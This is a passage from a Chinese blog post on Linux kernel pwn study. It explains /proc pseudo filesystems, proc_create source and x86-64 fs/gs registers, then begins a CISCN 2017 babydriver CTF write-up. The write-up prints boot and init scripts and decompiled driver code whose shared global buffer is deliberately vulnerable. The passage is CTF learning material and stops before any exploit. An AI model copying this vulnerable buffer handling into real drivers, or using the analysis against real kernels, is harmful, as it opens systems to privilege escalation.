ext4、FAT32、NTFS 等。这些文件系统实现了<u>对物理存储介质的管理</u>，包括文件的组织、存储、检索等操作。</li><li><strong>伪文件系统</strong>：是在内存中实现的，不涉及对物理存储介质的直接访问。它提供了一种访问内核状态和信息的机制，通过<u>在文件系统层次结构中创建伪文件</u>，用户和进程可以通过文件 I/O 接口来访问和修改内核的状态。</li></ul></li><li><strong>目的</strong>:<ul><li><strong>普通文件系统</strong>：主要用于存储和管理用户数据，提供了对数据的持久性存储和检索支持。这些文件系统通常关注于数据的长期保存和管理。</li><li><strong>伪文件系统</strong>：用于提供一种用户空间和内核空间之间的通信机制。通过伪文件系统，用户可以访问内核中的信息，例如系统状态、进程信息、设备信息等。这样的文件系统并非用于长期存储数据，而是用于提供一个接口来查询和配置内核状态。</li></ul></li><li><strong>位置</strong>:<ul><li><strong>普通文件系统</strong>：存储在物理存储介质上，例如硬盘、SSD 等。</li><li><strong>伪文件系统</strong>：存储在内存中，通常在 <code>/proc</code> 和 <code>/sys</code> 目录下，用于让用户和进程通过文件接口与内核进行通信。</li></ul></li></ol><p>经典的伪文件系统包括 <code>/proc</code> 和 <code>/sys</code>：</p><ul><li><code>/proc</code> 提供了对系统和进程信息的访问，例如 <code>/proc/cpuinfo</code> 可以查看 CPU 信息，<code>/proc/meminfo</code> 可以查看内存信息。</li><li><code>/sys</code> 则提供了对内核和设备参数的访问，例如 <code>/sys/class/gpio</code> 可以用于控制 GPIO。</li></ul><p>特别的伪文件系统只存在于内存中,不存在于硬盘中</p><h3 id="proc-create"><a href="#proc-create" class="headerlink" title="proc_create"></a>proc_create</h3><p>例题中使用了proc_create函数和remove_proc_entry</p><p>着重研究一下前者,毕竟后者想来是前者的逆操作</p><p>源码在内核<code>/fs/proc/generic.c</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_create</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">umode_t</span> mode,</span></span><br><span class="line"><span class="params">   <span class="keyword">struct</span> proc_dir_entry *parent,</span></span><br><span class="line"><span class="params">   <span class="type">const</span> <span class="keyword">struct</span> proc_ops *proc_ops)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> proc_create_data(name, mode, parent, proc_ops, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(proc_create);</span><br></pre></td></tr></table></figure><p>四个参数分别是</p><ol><li><code>name</code>,要创建的文件夹的名字</li><li><code>mode</code>,创建的文件夹的权限模式,<u>八进制</u>下的UGO模式</li><li><code>parent</code>,要创建节点的父节点,也就是要在哪个文件夹之下创建新文件夹，需要将那个文件夹的 proc_dir_entry 传入。如果直接在/proc/目录下则不需要</li><li><code>proc_ops</code>该文件的操作函数</li></ol><hr><p>其中还涉及到两个结构体proc_dir_entry和proc_ops</p><p>proc_ops是一个用于存放要注册的函数指针的结构体,之后对打开的设备文件调用对应函数便会指向这些函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> proc_flags;</span><br><span class="line"><span class="type">int</span>(*proc_open)(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line"><span class="type">ssize_t</span>(*proc_read)(<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line"><span class="type">ssize_t</span> (*proc_read_iter)(<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line"><span class="type">ssize_t</span>(*proc_write)(<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line"><span class="comment">/* mandatory unless nonseekable_open() or equivalent is used */</span></span><br><span class="line"><span class="type">loff_t</span>(*proc_lseek)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="type">int</span>(*proc_release)(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line"><span class="type">__poll_t</span> (*proc_poll)(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *);</span><br><span class="line"><span class="type">long</span>(*proc_ioctl)(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line"><span class="type">long</span>(*proc_compat_ioctl)(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span>(*proc_mmap)(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*proc_get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>proc_dir_entry则是proc文件系统下目录的存储结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * number of callers into module in progress;</span></span><br><span class="line"><span class="comment"> * negative -&gt; it&#x27;s going away RSN</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">atomic_t</span> in_use;</span><br><span class="line"><span class="type">refcount_t</span> refcnt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">pde_openers</span>;</span><span class="comment">/* who did -&gt;open, but not -&gt;release */</span></span><br><span class="line"><span class="comment">/* protects -&gt;pde_openers and all struct pde_opener instances */</span></span><br><span class="line"><span class="type">spinlock_t</span> pde_unload_lock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">pde_unload_completion</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span> *<span class="title">proc_iops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> *<span class="title">proc_ops</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_dir_ops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> *<span class="title">proc_dops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">seq_ops</span>;</span></span><br><span class="line"><span class="type">int</span> (*single_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">proc_write_t</span> write;</span><br><span class="line"><span class="type">void</span> *data;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> state_size;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> low_ino;</span><br><span class="line"><span class="type">nlink_t</span> nlink;</span><br><span class="line"><span class="type">kuid_t</span> uid;</span><br><span class="line"><span class="type">kgid_t</span> gid;</span><br><span class="line"><span class="type">loff_t</span> size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">parent</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span> <span class="title">subdir</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">subdir_node</span>;</span></span><br><span class="line"><span class="type">char</span> *name;</span><br><span class="line"><span class="type">umode_t</span> mode;</span><br><span class="line">u8 flags;</span><br><span class="line">u8 namelen;</span><br><span class="line"><span class="type">char</span> inline_name[];</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><hr><p>继续跟进<code>proc_create_data</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_create_data</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">umode_t</span> mode,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> proc_dir_entry *parent,</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="keyword">struct</span> proc_ops *proc_ops, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">p = proc_create_reg(name, mode, &amp;parent, data);</span><br><span class="line"><span class="keyword">if</span> (!p)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">p-&gt;proc_ops = proc_ops;</span><br><span class="line">pde_set_flags(p);</span><br><span class="line"><span class="keyword">return</span> proc_register(parent, p);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(proc_create_data);</span><br></pre></td></tr></table></figure><p>其中<code>proc_create_reg</code>的主要功能是创建并返回一个<code>proc_dir_entry</code>结构体指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_create_reg</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">umode_t</span> mode,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> proc_dir_entry **parent, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((mode &amp; S_IFMT) == <span class="number">0</span>)</span><br><span class="line">mode |= S_IFREG;</span><br><span class="line"><span class="keyword">if</span> ((mode &amp; S_IALLUGO) == <span class="number">0</span>)</span><br><span class="line">mode |= S_IRUGO;</span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(!S_ISREG(mode)))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">p = __proc_create(parent, name, mode, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (p) &#123;</span><br><span class="line">p-&gt;proc_iops = &amp;proc_file_inode_operations;</span><br><span class="line">p-&gt;data = data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后设置p-&gt;proc_ops = proc_ops;相当于完成注册函数</p><p>再返回函数proc_register进行注册</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* returns the registered entry, or frees dp and returns NULL on failure */</span></span><br><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_register</span><span class="params">(<span class="keyword">struct</span> proc_dir_entry *dir,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> proc_dir_entry *dp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (proc_alloc_inum(&amp;dp-&gt;low_ino))</span><br><span class="line"><span class="keyword">goto</span> out_free_entry;</span><br><span class="line"></span><br><span class="line">write_lock(&amp;proc_subdir_lock);</span><br><span class="line">dp-&gt;parent = dir;</span><br><span class="line"><span class="keyword">if</span> (pde_subdir_insert(dir, dp) == <span class="literal">false</span>) &#123;</span><br><span class="line">WARN(<span class="number">1</span>, <span class="string">&quot;proc_dir_entry &#x27;%s/%s&#x27; already registered\n&quot;</span>,</span><br><span class="line">     dir-&gt;name, dp-&gt;name);</span><br><span class="line">write_unlock(&amp;proc_subdir_lock);</span><br><span class="line"><span class="keyword">goto</span> out_free_inum;</span><br><span class="line">&#125;</span><br><span class="line">dir-&gt;nlink++;</span><br><span class="line">write_unlock(&amp;proc_subdir_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> dp;</span><br><span class="line">out_free_inum:</span><br><span class="line">proc_free_inum(dp-&gt;low_ino);</span><br><span class="line">out_free_entry:</span><br><span class="line">pde_free(dp);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更细的暂且不做分析</p><h2 id="延拓2"><a href="#延拓2" class="headerlink" title="延拓2"></a>延拓2</h2><p>​    Intel处理器实现了6个段寄存器，用来方便程序设计者对程序的代码、数据和栈进行分段和引用.</p><p>通常来说</p><ol><li>代码段用cs寄存器来分段和引用</li><li>数据段用ds寄存器来分段和引用</li><li>栈段用ss寄存器来分段和引用</li><li>另外3个段寄存器es、fs和gs可以用来分段和引用额外的数据段。</li></ol><p>​    在程序执行代码段里的代码、或访问数据段中的数据之前，需要事先将合法的16位段选择符的值加载到适当的段寄存器中，否则无法执行代码或访问数据。因此，虽然一个程序可以有很多段，但是某一时刻最多可以同时使用的只有其中的6个。要引用其他段，就要先加载对应的段选择符到适当的段寄存器中。</p><p>​    每个段寄存器都包含两个部分：对开发者可见的部分和不可见的隐藏部分。每当向一个段寄存器中加载段选择符的时候，处理器会自动将段选择符指向的段描述符中的基地址、限长和一些属性信息加载到段寄存器中的隐藏部分。</p><p>​    如果系统软件对某个段描述符进行了修改，那么系统软件也有责任重新加载对应的段寄存器，以确保对段描述符所做的修改能够生效（尤其是隐藏部分）。如果系统软件不重载段寄存器，那么缓存在段寄存器中隐藏部分的旧信息还会被继续使用。但从另一个角度来讲，只要不重载段寄存器，段寄存器的隐藏部分的内容就不会发生变化，在进行处理器模式切换的时候，比如从实模式切换到保护模式时之所以能够顺利执行，也是得益于这一原理。</p><h3 id="x86-64处理器模式下的段寄存器"><a href="#x86-64处理器模式下的段寄存器" class="headerlink" title="x86-64处理器模式下的段寄存器"></a>x86-64处理器模式下的段寄存器</h3><p>​    Intel理解到了现代操作系统设计者的想法，于是在x86-64处理器模式中，在微架构层将分段单元中的绝大多数功能都绕开了（注意不是关闭了分段单元）。</p><p>​    具体来说，在加载cs、ds、es和ss寄存器时，对应的段描述符中的基地址，限长和部分属性字段一概被忽略，并假设基地址总为0，限长总为2^64-1。同样在使用ds、es和ss段前缀的时候，也都做出同样的假设；同时，这些段寄存器中隐藏部分中与上述对应的字段也被忽略。因此x86-64处理器模式只支持平坦内存模型，即从0开始到2^48-1结束的规范化的虚拟地址空间，这是x86-64处理器模式中所做的硬性规定，因为这些规定可以进一步加快逻辑地址到虚拟地址的转换效率。</p><h3 id="x86-64处理器模式下的fs-gs段寄存器"><a href="#x86-64处理器模式下的fs-gs段寄存器" class="headerlink" title="x86-64处理器模式下的fs/gs段寄存器"></a>x86-64处理器模式下的fs/gs段寄存器</h3><p>​    虽说分段单元在x86-64处理器模式中绝大多数的情况下都被绕过了，但少数情况下不会绕过，就比如fs和gs段寄存器</p><p>​    但是64位处理器模式下的分段单元的微架构逻辑还是有些新的“猫腻”，具体做法是：获取fs和gs寄存器中隐藏部分的x86-64基地址（后文简写为fs.base和gs.base）的方式不再是通过fs和gs寄存器所指向的GDT/IDT中的段描述符来指定，而是在物理上就将fs和gs寄存器中隐藏部分中的64位基地址直接在物理上映射到了IA32_FS_BASE MSR（复位值为0）和IA32_GS_BASE MSR（复位值为0）这两个MSR上（或者说IA32_FS_BASE MSR和IA32_GS_BASE MSR分别是fs.base和gs.base的别名）。系统软件可以事先对这两个MSR进行编程，以便软件能够用fs和gs寄存器对特殊的数据进行引用。</p><p>具体来说，现代Linux x86-64下的fs/gs段寄存器的用途分别为：</p><ul><li><strong>用户态使用fs寄存器引用线程的glibc TLS和线程在用户态的stack canary；用户态的glibc不使用gs寄存器；应用可以自行决定是否使用该寄存器</strong></li><li><strong>内核态使用gs寄存器引用percpu变量和进程在内核态的stack canary；内核态不使用fs寄存器。</strong></li></ul><h1 id="CISCN-2017-babydriver"><a href="#CISCN-2017-babydriver" class="headerlink" title="CISCN 2017 babydriver"></a>CISCN 2017 babydriver</h1><h2 id="文件分析-1"><a href="#文件分析-1" class="headerlink" title="文件分析"></a>文件分析</h2><p>看一下boot.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   │ File: ../boot.sh</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ #!/bin/bash</span><br><span class="line">   2   │ </span><br><span class="line">   3   │ qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev</span><br><span class="line">       │ /ram oops=panic panic=1&#x27; -enable-kvm -monitor /dev/null -m 256M --nographic  -smp cores</span><br><span class="line">       │ =1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure><p>看到开启了smep保护</p><p>再看init</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">       │ File: init</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ #!/bin/sh</span><br><span class="line">   2   │  </span><br><span class="line">   3   │ mount -t proc none /proc</span><br><span class="line">   4   │ mount -t sysfs none /sys</span><br><span class="line">   5   │ mount -t devtmpfs devtmpfs /dev</span><br><span class="line">   6   │ chown root:root flag</span><br><span class="line">   7   │ chmod 400 flag</span><br><span class="line">   8   │ exec 0&lt;/dev/console</span><br><span class="line">   9   │ exec 1&gt;/dev/console</span><br><span class="line">  10   │ exec 2&gt;/dev/console</span><br><span class="line">  11   │ </span><br><span class="line">  12   │ insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">  13   │ chmod 777 /dev/babydev</span><br><span class="line">  14   │ echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">  15   │ setsid cttyhack setuidgid 1000 sh</span><br><span class="line">  16   │ </span><br><span class="line">  17   │ umount /proc</span><br><span class="line">  18   │ umount /sys</span><br><span class="line">  19   │ poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>其中insmod加载了babydriver.ko驱动</p><h2 id="模块分析-1"><a href="#模块分析-1" class="headerlink" title="模块分析"></a>模块分析</h2><p>checksec</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/babydriver/babydriver.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>几乎没有保护</p><p>根据fops结构体可以知道驱动提供的外部接口对应如下</p><ul><li>open =&gt; babyopen</li><li>read =&gt; babyread</li><li>write =&gt; babywrite</li><li>ioctl =&gt; babyioctl</li><li>free =&gt; babyrelease</li></ul><p><strong>babyioctl:</strong> 定义了 0x10001 的命令，可以释放全局变量 babydev_struct 中的 device_buf，再根据用户传递的 size 重新申请一块内存，并设置 device_buf_len。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;\x013defalut:arg is %ld\n&quot;</span>, v3, v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>babyopen:</strong> 申请一块空间，大小为 0x40 字节，地址存储在全局变量 babydev_struct.device_buf 上，并更新 babydev_struct.device_buf_len</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">0x40</span>LL);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">0x24000C0</span>LL, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>babyread:</strong> 先检查长度是否小于 babydev_struct.device_buf_len，然后把 babydev_struct.device_buf 中的数据拷贝到 buffer 中，buffer 和长度都是用户传递的参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">      copy_to_user(buffer, babydev_struct.device_buf, v4);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>babywrite:</strong> 类似 babyread，不同的是从 buffer 拷贝到全局变量中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">      copy_from_user(babydev_struct.device_buf, buffer, v4);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>babyrelease:</strong> 释放空间，没什么好说的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="细节问题"><a href="#细节问题" class="headerlink" 